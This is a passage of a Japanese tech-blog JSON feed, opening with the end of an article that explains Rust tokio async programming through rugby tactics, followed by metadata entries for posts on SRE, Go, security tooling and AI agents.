2025しかしこのシンプルさこそが、複雑化した現代ラグビーにおいて効果を発揮している。過度に複雑化した攻撃パターン、過剰なデコイランナー、計算され尽くしたムーブ。これらすべてに対して、純粋な技術と判断力に基づくドロー＆パスは、予測不可能性という武器を持つ。この戦術の本質は、ディフェンダーの「肩」を読むことにある。ディフェンダーの肩の向きは、彼らが次にどちらに動くかを示している。その弱い肩側に攻撃を仕掛ければ、タックルの威力は半減する。これは瞬時の観察と判断を要求する。まさに非同期プログラミングにおける「ノンブロッキングIO」の概念と同じだ。ディフェンダーの反応を「待つ」のではなく、その動きを「観察しながら」次の行動を準備する。// ドロー＆パスの判断ロジックasync fn draw_and_pass_decision() {    // ボールを持って前進    let carrier_movement = advance_with_ball();    // 並行してディフェンダーを観察    let defender_analysis = tokio::spawn(async {        loop {            let shoulder_direction = observe_defender_shoulder().await;            let commitment_level = assess_commitment().await;            if commitment_level > THRESHOLD {                return DecisionPoint::PassNow(shoulder_direction);            }            tokio::time::sleep(Duration::from_millis(50)).await;        }    });    // ボールキャリアとディフェンダー分析を並行実行    tokio::select! {        _ = carrier_movement => {            // コンタクトに入ってしまった            BreakdownAction::SecureBall        }        decision = defender_analysis => {            // ディフェンダーがコミットした            match decision.unwrap() {                DecisionPoint::PassNow(weak_shoulder) => {                    execute_pass_to_gap(weak_shoulder).await                }            }        }    }}4. コンテスタブルキック2025年のラグビーにおいて、コンテスタブルキック（contestable kick）は単なる戦術オプションから、ゲームプランの中核へと進化した。これは、キックしたボールを自チームが奪還できる可能性のあるキックを指す。クロスフィールドキック、ボックスキック、グラバーキック。これらすべてが、現代の試合で頻繁に見られる。クロスフィールドキックの実行を考えてみよう。フライハーフがボールを受け取り、ディフェンスラインを一瞥する。反対サイドのウイングは、すでにタッチライン際で準備を整えている。キックが蹴られる瞬間、ウイングは全力でチェイスを開始する。ボールが空中にある2秒から3秒の間に、ウイングは15メートルから20メートルを走り、相手のウイングよりも早くボールの落下地点に到達しなければならない。これは非同期操作の好例だ。キックの実行とチェイスの開始は同時に行われる。さらに、他のフォワードも並行してサポートポジションへ移動する。ボールがキャッチされた瞬間、そこには攻撃態勢が整っている。もしくは、相手がキャッチに失敗すれば、即座にターンオーバーのチャンスが生まれる。// クロスフィールドキックの並行実行async fn crossfield_kick_play() {    // キックの準備と実行    let kick_execution = async {        let target_position = calculate_optimal_landing_spot().await;        execute_crossfield_kick(target_position).await    };    // ウイングのチェイス    let wing_chase = async {        // キックのモーションを検知したら即座に開始        wait_for_kick_trigger().await;        sprint_to_landing_spot().await;        compete_for_ball().await    };    // フォワードのサポート    let forward_support = async {        // キックと同時にサポートポジションへ        move_to_support_position().await;        prepare_for_breakdown().await    };    // その他のバックスの再配置    let backs_realignment = async {        reposition_for_second_phase().await    };    // これらすべてが並行して実行される    tokio::join!(        kick_execution,        wing_chase,        forward_support,        backs_realignment    );}5. モメンタムベースのラグビー現代ラグビーのもう1つの重要な概念が「モメンタム」だ。これは物理的な勢いだけでなく、心理的、戦術的な優位性の連鎖を指す。一度モメンタムを得たチームは、それを維持し続けることで相手を圧倒する。モメンタムの獲得は、しばしばブレイクダウンでの優位性から始まる。素早くボールを確保し、3秒以内に次のフェーズを開始する。ディフェンスは体制を整える時間がない。次のフェーズも同様に速い。そしてまた次も。3フェーズ、4フェーズ、5フェーズと連続して攻撃が続くと、ディフェンスは徐々に後退を始める。疲労が蓄積し、判断力が鈍る。そこにギャップが生まれ、トライのチャンスが訪れる。これを非同期システムで表現するなら、各フェーズは前のフェーズの完了を待たずに準備を開始する。パイプライン処理のように、連続したタスクが重なり合いながら実行される。// モメンタムベースの連続攻撃async fn momentum_based_attack() {    let mut phase_count = 0;    let mut momentum_level = 0;    loop {        let phase_start = Instant::now();        // 現在のフェーズを実行しながら、次のフェーズを準備        let (current_phase, next_preparation) = tokio::join!(            execute_current_phase(phase_count),            prepare_next_phase(phase_count + 1)        );        let phase_duration = phase_start.elapsed();        // Lightning Quick Ball（3秒以内）を達成できたか        if phase_duration.as_secs() <= 3 {            momentum_level += 1;            println!(\\"Momentum building: level {}\\", momentum_level);        } else {            momentum_level = momentum_level.saturating_sub(1);            println!(\\"Momentum slowing: level {}\\", momentum_level);        }        // モメンタムが高いほど、ディフェンスにプレッシャー        if momentum_level >= 3 {            // ディフェンスが乱れている可能性が高い            if let Some(gap) = detect_defensive_gap().await {                exploit_gap(gap).await;                break; // トライの可能性            }        }        phase_count += 1;        // ブレイクダウンで負けたら終了        if current_phase.is_turnover() {            break;        }    }}実行可能なコード例についてこの記事のコード例はすべて実際にコンパイル・実行可能で、Rust 2024 Editionのベストプラクティスに準拠しています。Rust 2024 Editionの活用:Prelude改善: FutureとIntoFutureが自動インポートRPIT: Return Position Impl Traitでより簡潔な型シグネチャComprehensive Rustdoc: すべての公開APIに包括的なドキュメントコード品質: cargo clippy -- -D warnings 完全対応完全なプロジェクトをGitHubで公開:# リポジトリをclonegit clone https://github.com/nwiizo/2025-rugby-async-demo.gitcd 2025-rugby-async-demo# 1. メインの例を実行（基本的な非同期処理）cargo run# 2. 高度な例を実行（Rust 2024の機能をフル活用）cargo run --example modern_rugby_2024# 3. 複雑なゲームシミュレーション（現実的な意思決定）cargo run --example complex_game_simulation3つの実装例:基本デモ (cargo run) - スタンドオフの基本的な判断プロセス高度な例 (modern_rugby_2024) - カスタムエラー型と明示的な型定義複雑なシミュレーション (complex_game_simulation)10以上の変数を考慮した現実的な意思決定試合時間、スコア差、フィールドポジション、天候、風、疲労度連続フェーズ数、ペナルティ、イエローカード、ゲームルール7つの主要シナリオに基づく判断ロジックGitHubリポジトリ: https://github.com/nwiizo/2025-rugby-async-demo記事内のコードは教育的な目的で簡略化されています。完全な実装とRust 2024のベストプラクティスについては、GitHubリポジトリを参照してください。試合中の状況判断（コード例）あなたがスタンドオフだとして、攻撃の組み立てを考える。SOは「司令塔」と呼ばれ、刻一刻と変わる状況を見ながら、複数の選択肢を同時に検討し、最適な判断を下す必要がある。攻撃準備フェーズでは、スクラムハーフからのパスを待つ（1-2秒）、ディフェンスラインを読む（継続的）、味方のポジショニングを確認（継続的）する。判断と実行フェーズでは、バックスラインへの展開を指示（3秒）、フォワードへのサインを送る（2秒）、キックのオプションを検討（1秒）する。そして実行フェーズで最適な選択をする。同期的なアプローチ（非効率）すべてを順番に行うと、スクラムハーフからのパスを待つ（2秒）、ディフェンスラインを読む（3秒）、味方のポジショニングを確認（2秒）、バックスの準備を待つ（3秒）、フォワードの準備を待つ（2秒）、判断と実行（1秒）で合計13秒。すでにディフェンスに囲まれています。この方法では、ボールが来るのを待っている間、何も考えない。ディフェンスを読み終わるまで、味方の位置を確認しない。これでは勝てない。非同期的なアプローチ（効率的）use tokio::time::{sleep, Duration};// ディフェンスラインの状態#[derive(Debug, Clone)]struct DefenseLine {    pressure: bool,    gap_on_left: bool,    gap_on_right: bool,}// 味方の状態#[derive(Debug, Clone)]struct Teammates {    backs_ready: bool,    forwards_ready: bool,}async fn wait_for_ball() -> String {    println!(\\"\uD83C\uDFC9 スクラムハーフからのパスを待機...\\");    sleep(Duration::from_secs(2)).await;    println!(\\"✓ ボール受け取り完了\\");    \\"ボール受領\\".to_string()}async fn read_defense() -> DefenseLine {    println!(\\"\uD83D\uDC40 ディフェンスラインを読む...\\");    sleep(Duration::from_secs(1)).await;    let defense = DefenseLine {        pressure: false,        gap_on_left: true,        gap_on_right: false,    };    println!(\\"✓ ディフェンス分析完了: 左にギャップあり\\");    defense}async fn check_teammates() -> Teammates {    println!(\\"\uD83D\uDC65 味方のポジショニング確認...\\");    sleep(Duration::from_millis(800)).await;    let teammates = Teammates {        backs_ready: true,        forwards_ready: true,    };    println!(\\"✓ 味方の準備完了\\");    teammates}async fn signal_backs() {    println!(\\"\uD83D\uDCE2 バックスに展開のサイン...\\");    sleep(Duration::from_millis(500)).await;    println!(\\"✓ バックス準備完了\\");}async fn signal_forwards() {    println!(\\"\uD83D\uDCE2 フォワードにサポートのサイン...\\");    sleep(Duration::from_millis(500)).await;    println!(\\"✓ フォワード準備完了\\");}async fn make_decision(    ball: String,    defense: DefenseLine,    teammates: Teammates) -> String {    println!(\\"\\\\n\uD83E\uDDE0 状況を統合して判断...\\");    if defense.gap_on_left && teammates.backs_ready {        \\"左サイドへパス展開\\".to_string()    } else if !defense.pressure && teammates.forwards_ready {        \\"フォワードにクラッシュボール\\".to_string()    } else {        \\"ハイパントキック\\".to_string()    }}#[tokio::main]async fn main() {    let start = std::time::Instant::now();    println!(\\"=== 攻撃開始 ===\\\\n\\");    // フェーズ1: 情報収集（すべて並行実行）    let (ball, defense, teammates) = tokio::join!(        wait_for_ball(),        read_defense(),        check_teammates()    );    // フェーズ2: サイン出し（並行実行）    tokio::join!(        signal_backs(),        signal_forwards()    );    // フェーズ3: 判断と実行    let decision = make_decision(ball, defense, teammates).await;    let duration = start.elapsed();    println!(\\"\\\\n\uD83C\uDFAF 決定: {}\\", decision);    println!(\\"⏱️  判断までの時間: {:.1}秒\\", duration.as_secs_f64());    println!(        \\"\\\\n\uD83D\uDCA1 並行処理により、順次処理の13秒から{:.1}秒に短縮。\\",        duration.as_secs_f64()    );}優秀なSOは、ボールを待ちながらディフェンスを読み、同時に味方の位置を確認し、複数のオプションを並行して準備している。ボールが手元に来た瞬間には、すでに判断が完了している。これが非同期の本質だ。待っている時間を有効活用する。おわりにここまで読んでくれて、本当にありがとう。途中で「なんでラグビー？」という疑問が何度も頭をよぎったと思う。それでも最後まで付き合ってくれたあなたは、優しい人だ。非同期プログラミングの本質は、「待ち時間を無駄にしない」ことだと思う。スタンドオフがボールを待つ間にディフェンスを読むように。ポッドが独立して動きながら全体として協調するように。クロスフィールドキックと同時にチェイスが始まるように。私たちのコードも、IOを待つ間に他の処理を進めて、複数のタスクを並行して実行して、結果を効率的に統合できる。async/awaitという文法は、単なるシンタックスシュガーじゃない。複雑な並行処理を、人間が理解しやすい形で表現するための抽象化だ。ラグビーのプレーブックが複雑な戦術をシンプルな図で表現するみたいに。非同期プログラミングは、別に難しくない。少なくとも、80分間フィールドを走り回りながら瞬時に判断を下すスタンドオフの仕事よりは、ずっと楽だと思う。座ったままキーボードを叩けるんだから。次にtokio::join!やasync fnを書くとき、もしよかったら、ラグビーフィールドでポッドが動く様子を思い浮かべてみてほしい。きっと、コードの意味がより直感的に理解できる。少なくとも私はそう思う。それじゃあ、良い非同期ライフを。P.S. もしこのブログを読んでラグビーに興味を持ったら、実際の試合を観てみてほしい。スタンドオフの動きを追っていると、「あ、これtokio::select!だ」とか思えるようになる。たぶん。P.P.S. もしこのブログを読んでRustに興味を持ったら、The Rust Programming Languageを読んでみてほしい。非同期の章を読むとき、きっとラグビーのことを思い出すはず。たぶん。Async Rust ―高いパフォーマンスと安全性を両立するRustによる非同期処理作者:Maxwell Flitton,Caroline Mortonオーム社Amazon","isoDate":"2025-11-08T06:08:36.000Z","dateMiliSeconds":1762582116000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Vertex AI Agent Engine を運用していくうえでのノウハウ","link":"https://sreake.com/blog/know-how-to-operate-vertex-ai-agent-engine/","contentSnippet":"1. はじめに はじめまして、Sreake事業部の井上 秀一です。私はSreake事業部にて、SREや生成AIに関するResearch & Developmentを行っています。本記事は、Google Cloud […]The post Vertex AI Agent Engine を運用していくうえでのノウハウ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-07T09:42:52.000Z","dateMiliSeconds":1762508572000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2025-11-08 Security JAWS TerraformによるIAM Policy記述ガイド","link":"https://speakerdeck.com/masasuzu/2025-11-08-security-jaws-terraformniyoruiam-policyji-shu-gaido","contentSnippet":"[[IAMスペシャル！]Security-JAWS【第39回】 勉強会 2025年11月08日(土) - connpass](https://s-jaws.connpass.com/event/366395/) の発表資料","isoDate":"2025-11-07T05:00:00.000Z","dateMiliSeconds":1762491600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Redux基礎: APIをfetchして非同期でデータを表示する処理","link":"https://zenn.dev/takehiro1111/articles/react_redux_async_thunk","contentSnippet":"1.記事を書いた背景初めてReduxを触っているのですが、独特で慣れが必要だなと感じたのでコンポーネントを整理するにあたり、形として残しておきたかったためです。Reduxに不慣れな方のご参考にもなれば幸いです。 2.書くこと各コンポーネントの説明APIをfetchしてデータ表示する処理のコード 3.Reduxとは？Reduxは、アプリケーション全体の状態を管理および更新するためのパターンとライブラリです。UIは「アクション」と呼ばれるイベントをトリガーして何が起こったかを伝え、それに応じて「リデューサー」と呼ばれる別の更新ロジックが状態を更新します。Redu...","isoDate":"2025-11-03T03:43:35.000Z","dateMiliSeconds":1762141415000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Observability Conference Tokyo 2025に参加してきました！","link":"https://sreake.com/blog/o11y-con-tokyo-2025/","contentSnippet":"はじめに 3-shakeで マーケティング・ブランディングを行なっている永瀬です。 2025/10/27に Observability Conference Tokyo 2025 が開催されましてスリーシェイクもスポンサ […]The post Observability Conference Tokyo 2025に参加してきました！ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-31T09:21:45.000Z","dateMiliSeconds":1761902505000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Gemini Enterprise（旧Google Agentspace）を活用する","link":"https://sreake.com/blog/get-started-with-gemini-enterprise/","contentSnippet":"Gemini Enterprise（旧Google Agentspace）の概要 2025/10/10まではGoogle Agentspaceと呼ばれていたGoogle AIアシスタントサービスのサービス名称変更が行われ […]The post Gemini Enterprise（旧Google Agentspace）を活用する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-31T01:22:38.000Z","dateMiliSeconds":1761873758000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【初心者向け】Snowflakeロールベースアクセス制御（RBAC）解説","link":"https://sreake.com/blog/learn-about-snowflake-role-based-access-control/","contentSnippet":"はじめに Snowflakeでデータ分析基盤を構築するうえで、最も重要な要素の一つがロール管理です。これはデータガバナンスの活動の第一歩の位置付けでもあり、さらにはある程度成熟された基盤の状態からロールを再設計するコスト […]The post 【初心者向け】Snowflakeロールベースアクセス制御（RBAC）解説 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-31T01:21:49.000Z","dateMiliSeconds":1761873709000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Trayce, a Raycast Extension for Tokyo AI Hackathon 2025","link":"https://speakerdeck.com/ota1022/trayce-a-raycast-extension-tokyo-ai-hackathon-2025","contentSnippet":"The pitch deck for a Raycast extension called Trayce, created at the Tokyo AI Hackathon.\\rhttps://raycast.connpass.com/event/369928/","isoDate":"2025-10-30T04:00:00.000Z","dateMiliSeconds":1761796800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"WebSocket入門：GoでEcho/Chat機能を実装してみた","link":"https://zenn.dev/takehiro1111/articles/go_web_socket","contentSnippet":"1.記事を書いた背景WebSocket の実装が初めてだったこともあり、頭の中を整理しておこうと思い記事にしました。全然関係ないですが、1 年くらい前にプロダクトへサーバレス構成でチャット機能を実装する時にインフラ側の基盤を作ったのが懐かしく感じました。 2.対象読者WebSocket って聞いたことあるけど何だっけという方(自分みたいな)実装レベルで気になる方(自分みたいな) 3.WebSocket とは？WebSocket API は、ユーザーのブラウザーとサーバー間で対話的な通信セッションを開くことができるものです。この API を使用すると、サーバー...","isoDate":"2025-10-30T02:43:23.000Z","dateMiliSeconds":1761792203000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Astro で Standard ML のシンタクスハイライト","link":"https://silasol.la/posts/2025-10-26-02_astro-sml/","contentSnippet":"デフォルトでハイライトされない言語を TextMate を用いた拡張で認識させます．","isoDate":"2025-10-26T00:00:00.000Z","dateMiliSeconds":1761436800000,"authorName":"Masaki Haga","authorId":"silasolla"},{"title":"anyenvやasdfに代わる？miseで始める開発環境管理","link":"https://sreake.com/blog/mise-development-env-management/","contentSnippet":"はじめに 開発環境の構築において「このプロジェクトは Node.js 16 系だけど、別の案件は 18 系じゃないと動かない」といった状況に遭遇することは少なくありません。 プロジェクトごとに異なる言語やツールのバージョ […]The post anyenvやasdfに代わる？miseで始める開発環境管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-24T12:34:35.000Z","dateMiliSeconds":1761309275000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Go + React(TypeScript)の実装で理解するCORS","link":"https://zenn.dev/takehiro1111/articles/go_cors_implement","contentSnippet":"1.記事を書いた背景私はインフラ側の経験が主ですが、開発チームから依頼されてS3のCORS許可ポリシーを設定することが何度かありました。ただ、その度に調べて何となく理解し直すということを繰り返していてインフラ視点での理解に留まっていて少しモヤのある状態でした。（実際にアプリ側の実装を行い、いくつかの実装パターンがあるという点も把握しないと感覚的な理解が得にくい設定だと思います。）今回、GoのAPI開発を通してアプリケーション側でCORSを実装したことでより深く理解できたので、自分の知識を整理する目的で本記事をまとめています。 2.対象読者CORSの概念や設定について...","isoDate":"2025-10-23T08:42:30.000Z","dateMiliSeconds":1761208950000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Gemini CLI でセキュアで堅牢な開発をするためのプラクティス集","link":"https://zenn.dev/kimitsu/articles/secure-and-robust-development-with-gemini-cli","contentSnippet":"先日、クラウドネイティブ \xd7 Gemini CLIというイベントで『Gemini CLI でもセキュアで堅牢な開発をしたい！』というタイトルで登壇させていただきました。時間都合で端折ってしまった部分が多かったため、本記事で行間を埋めつつ最新の状況をお伝えします。登壇の内容は全て記載するため、イベントに参加されなかった方も読んでいただければと思います。 はじめに本記事は Gemini CLI を個人レベルではなく企業やチームとして使いたい方を対象とします。そのため、Gemini CLI の基本的な部分（例えばどのようにインストールするか、settings.jsonとは何か、基本...","isoDate":"2025-10-23T01:52:31.000Z","dateMiliSeconds":1761184351000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Go/Ginでslogを使ったロギングのミドルウェア実装","link":"https://zenn.dev/takehiro1111/articles/go_gin_logger","contentSnippet":"1.記事を書いた背景自分の整理用とこんな書き方もあるんだ程度に参考になればと思い記事に起こしています。実装を進める中で変なスイッチも入り、様々な機能を追加していきました。結果的にリクエストボディのマスキングや分散トレーシングのためのリクエストID生成など、本番環境での使用を一定想定した機能を実装しました。 2.機能要件箇条書きで見づらいと思いますが、以下の機能を付け足してます。- ミドルウェアとして実装してラップすることで全てのエンドポイントに適用できる。- 時刻等の可変性のある設定については、依存性を注入し実装すること。  - テストコードでMockを...","isoDate":"2025-10-21T09:05:31.000Z","dateMiliSeconds":1761037531000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Gemini CLIでもセキュアで堅牢な開発をしたい！","link":"https://speakerdeck.com/yunosukey/gemini-clidemosekiyuadejian-lao-nakai-fa-wositai","contentSnippet":"","isoDate":"2025-10-19T04:00:00.000Z","dateMiliSeconds":1760846400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"GitHub Actions の Job から WireGuard で VPN アクセス","link":"https://qiita.com/yteraoka/items/eef62dc05aa96fbed3b6","contentSnippet":"背景GitHub Actions の Job で家のネットワークにアクセスさせたいことがあり、いったんは Squid を認証付きで publilc に公開するというのをやっていたのですが、やっぱり嬉しくないのでどうしたものかと思っていたのですが WireGuard が使...","isoDate":"2025-10-18T09:09:27.000Z","dateMiliSeconds":1760778567000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AIエージェント入門 〜基礎からMCP・A2Aまで〜","link":"https://speakerdeck.com/shukob/aiezientoru-men-ji-chu-karamcpa2amade","contentSnippet":"https://genai-users.connpass.com/event/373059/\\r2025年10月18日、オープンソースカンファレンス2025 Online/Fallで発表した資料です。\\r\\r今話題となっている「AIエージェント」について、要素技術となる生成AIを用いてどのように自律的に動作するのか基礎を説明した後、AIが外部のツールやデータにアクセスするためのオープンプロトコルであるMCP（Model Context Protocol）や、複数のエージェントによる分業と連携を可能にするオープンプロトコルA2A（Agent-to-Agent）について解説しました。","isoDate":"2025-10-18T04:00:00.000Z","dateMiliSeconds":1760760000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"英語4文字のセキュリティ用語あれこれ説明できる？ - SBOM/SAST/DAST...","link":"https://zenn.dev/r4ynode/articles/security-english-words","contentSnippet":"セキュリティの話になると、謎の4文字くらいの英語が羅列しているのを見たことありません？それらのセキュリティ用語を説明できますか？私はできません多すぎて分からなくなるので少し整理します。!内容は概要程度です。機能面についても利用するソフトウェアやベンダーに依存するため参考程度に。 早見表用語一言解説SBOMソフトウェア部品表。構成要素を一覧化する。SCAOSSやライブラリの脆弱性・ライセンス管理。ASTアプリの脆弱性を検出するセキュリティテスト。SASTソースコードを静的解析して脆弱性検出。DAST実行中アプリに攻撃して...","isoDate":"2025-10-18T03:00:01.000Z","dateMiliSeconds":1760756401000,"authorName":"Reito Koike","authorId":"reito"},{"title":"ディレクトリ構成 ~ハイブリッド型編~","link":"https://sreake.com/blog/hybrid-directory-structure-good-practice/","contentSnippet":"はじめに アプリケーション開発において、ディレクトリ構成は保守性・拡張性・開発効率に直結する設計要素です。 本記事では、ディレクトリ構成に悩む現場に向けて、ハイブリッド型構成をご紹介します。 ⚠️ この構成が「唯一の正解 […]The post ディレクトリ構成 ~ハイブリッド型編~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-16T04:41:28.000Z","dateMiliSeconds":1760589688000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Prometheus + Step Functions + Lambdaで構築するサーバレスオンコール基盤","link":"https://zenn.dev/nextbeat/articles/oncall_architecture_nb","contentSnippet":"1. 前提 ブログを書いた背景Lambda のランタイムバージョン更新対応に携わる中で、既存のオンコール基盤のリファクタリングと改修を実施しました。具体的な実装や要件ははあまり記述していませんが、アーキテクチャの参考例になればと思いブログに起こしました。 オンコール体制の方針弊社では全員 CTO というテーマを掲げて、各エンジニアが主体的に事業及びプロダクトに関わる文化を醸成しています。それに伴い、オンコール体制もエンジニア全員が参加する体制をとっています。全員CTOとは？と気になる方はEntrance Book覗いてみてください\uD83D\uDE04https://note....","isoDate":"2025-10-14T06:25:59.000Z","dateMiliSeconds":1760423159000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"TFLintカスタムプラグインで始める Terraformコード品質管理","link":"https://speakerdeck.com/bells17/tflintkasutamupuraguindeshi-meru-terraformkodopin-zhi-guan-li","contentSnippet":"Go Night Talks – After Conference の LT資料です\\rhttps://mercari.connpass.com/event/367075/","isoDate":"2025-10-14T04:00:00.000Z","dateMiliSeconds":1760414400000,"authorName":"bells17","authorId":"bells17"},{"title":"[Go]RateLimitingを適用するミドルウェアの実装","link":"https://zenn.dev/takehiro1111/articles/go_ratelimit","contentSnippet":"本記事の内容Go で IP ベースでレート制限をかける際の具体的な実装(ミドルウェアとして記載)以下は本記事では触れない。IP ベース以外の制限での実装RateLimit についての説明インフラ側だと WAF で IP ベースでのレート制限を行うこともありますが、今回の記事では考慮に入れてません。 機能要件同一 IP からのリクエスト回数を制限1分間に10回までと制限を行い、利用可能なトークンがない場合は429 Too Many Requests を返す。Token Bucket方式でバースト許容(一時的な急増OK)を採用しています。ミドルウ...","isoDate":"2025-10-13T07:33:46.000Z","dateMiliSeconds":1760340826000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Modern Monolithを作りましょう！ Inertia.jsの紹介とその先","link":"https://speakerdeck.com/aminevg/modern-monolithwozuo-rimasiyou-inertia-dot-jsnoshao-jie-tosonoxian","contentSnippet":"マイクロサービス流行の時代で、あえてモノリスを作りませんか？\\r\\rバックエンドとフロントエンドの連携を行う際は、辛い思いをした方が多いのではないでしょうか。\\rAPIの作成、認証の実装、フォーム送信など、様々なハードルがあります。\\rそういった問題を解決して、フルスタック開発を楽にするライブラリさえあれば...\\r実際にありますよ！\\r\\rこのLTでは、SPAのフロントエンドをバックエンド内で作れるInertia.jsをご紹介します。\\r基本的な使い方から、直近の新機能やInertia.jsの将来を解説します。\\rこのLTを通じて、「フルスタック開発が楽になった！」「フロントエンドのためのAPI設計はもうさらばだ！」と思ってもらえればと思います。","isoDate":"2025-10-11T04:00:00.000Z","dateMiliSeconds":1760155200000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"楽にあなたのクラウドを守ろう！ - CNAPP概要","link":"https://zenn.dev/r4ynode/articles/cloud-security-using-cnapp","contentSnippet":"要約複数のセキュリティツールを使うのって大変だよねCNAPPとは統合セキュリティプラットフォーム っていう概念だよタイトルの「楽に」の意味は、CNAPP導入で結果的に運用が楽になるよ、という意味だよCNAPPを実現するツールは色々あるよ はじめにクラウドネイティブアプリケーションのセキュリティ対策で以下のような課題を抱えていませんか？複数のセキュリティツールを個別に運用しているそれぞれが独立した警告を発し、全体像が見えない運用コストが膨大で重要な脅威を見逃すリスクがあるそんな課題を解決するのがCNAPP（Cloud Native Application ...","isoDate":"2025-10-10T23:00:05.000Z","dateMiliSeconds":1760137205000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Gemini CLI から Cloud Run にデプロイした MCP サーバに接続するベストプラクティス","link":"https://zenn.dev/kimitsu/articles/gemini-cli-cloud-run-mcp","contentSnippet":"10 月 8 日に Gemini CLI v0.8.0 がリリースされ、その中で IAP で保護された Cloud Run にデプロイされた MCP サーバへの接続がサポートされました。[1]この新しい方法は、従来の Cloud Run プロキシを使う方法や OIDC ID トークンを使う方法のデメリットを解消しており、Gemini CLI から Cloud Run 上の MCP サーバに接続するベストプラクティスが確立されたと考えています。今回はこの IAP for Cloud Run とサービスアカウントなりすましを使った方法を紹介します。 従来の方法とそのデメリット従来の...","isoDate":"2025-10-09T08:31:51.000Z","dateMiliSeconds":1759998711000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Spec DrivenでAI駆動開発を加速させる - Spec Kit入門","link":"https://zenn.dev/r4ynode/articles/spec-driven-development-using-spec-kit","contentSnippet":"はじめにAIに対して工夫なしの指示だと開発に限界を感じることもあるでしょう。AIにしっかりとコンテキストを渡してあげないと、意図通りに動いてくれません。考えられる解決策としては、自前でコンテキストや指示を書いたインストラクションMarkdownファイルを与える方法があります。個人的にはインストラクションの方が手軽なのでよくやりますが、先日以下の記事でSpec Drivenという言葉を見かけました。https://github.blog/ai-and-ml/generative-ai/spec-driven-development-with-ai-get-started-with...","isoDate":"2025-10-03T23:00:05.000Z","dateMiliSeconds":1759532405000,"authorName":"Reito Koike","authorId":"reito"},{"title":"DevOps/MLOpsに学ぶエージェントの可観測性","link":"https://speakerdeck.com/yunosukey/mlopsnixue-buezientonoke-guan-ce-xing","contentSnippet":"","isoDate":"2025-10-03T04:00:00.000Z","dateMiliSeconds":1759464000000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"KubernetesのSigstore活用","link":"https://sreake.com/blog/utilize-kubernetes-sigstore/","contentSnippet":"本記事では、KubernetesにおけるSigstoreプロジェクトの活用方法を解説します。 Sigstoreの概要や導入事例、キーレス署名については、前回の記事[Cosignによる署名検証とSigstoreの全体像]を […]The post KubernetesのSigstore活用 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-01T00:50:40.000Z","dateMiliSeconds":1759279840000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Cosignによる署名検証とSigstoreの全体像","link":"https://sreake.com/blog/signature-verification-by-cosign-and-sigstore/","contentSnippet":"Sigstore Sigstore は、コンテナイメージ、バイナリ、SBOMなどのソフトウェアアーティファクトに対して、安全な署名と検証を実現するOSSプロジェクトです。これを使うことで、ソフトウェアサプライチェーンのセ […]The post Cosignによる署名検証とSigstoreの全体像 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-01T00:50:01.000Z","dateMiliSeconds":1759279801000,"authorName":"Sreake","authorId":"Sreake"},{"title":"バイブコーディングと継続的デプロイメント","link":"https://speakerdeck.com/nwiizo/baibukodeingutoji-sok-de-depuroimento","contentSnippet":"2025年9月30日（火）、「バイブコーディングもくもく会 #03」というイベントで登壇することになった。\\rhttps://aimokumoku.connpass.com/event/368935/\\r\\r正直に言うと、このイベントがどんな空気感なのか、まだ全然掴めていない。ゆるい感じなのか、ガチな感じなのか。笑いを取りに行くべきなのか、真面目にやるべきなのか。そういう「場の空気」みたいなものが事前に分からないのは、けっこう怖い。だから、とりあえず色々なパターンを想定して準備している。要するに、どんな状況になっても対応できるように、という保険をかけまくっているのだ。我ながら、慎重すぎるかもしれない。\\r\\rブログとGithubはこちら。\\rhttps://syu-m-5151.hatenablog.com/\\rhttps://github.com/nwiizo\\r\\r一応、置いておく。見られるのは恥ずかしいけど、見られないのも寂しい。そういう矛盾した感情を抱えながら、当日を迎えることになりそうだ。Marp の資料はこちらです。\\rhttps://github.com/nwiizo/3shake-marp-templates/blob/main/slides/2025/vibe-coding-continuous-deployment.md","isoDate":"2025-09-30T04:00:00.000Z","dateMiliSeconds":1759204800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"InstructorライブラリとClean Architectureで実現する型安全なAI統合パターン","link":"https://sreake.com/blog/typesafe-ai-integration-pattern-with-instructor-library-and-clean-architecture/","contentSnippet":"はじめに 近年、業務アプリケーションにAI機能を組み込む事例が急速に増えています。しかし、AIの出力は本質的に不確実性を含むため、従来のWebアプリケーション開発で重視されてきた型安全性や保守性を維持することが課題となっ […]The post InstructorライブラリとClean Architectureで実現する型安全なAI統合パターン first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-29T13:27:21.000Z","dateMiliSeconds":1759152441000,"authorName":"Sreake","authorId":"Sreake"},{"title":"構造化出力を安定してLLMにさせたいなら「instructor」はいかが？","link":"https://sreake.com/blog/make-llm-output-stable-by-instructor/","contentSnippet":"はじめに：LLMの出力制御の課題 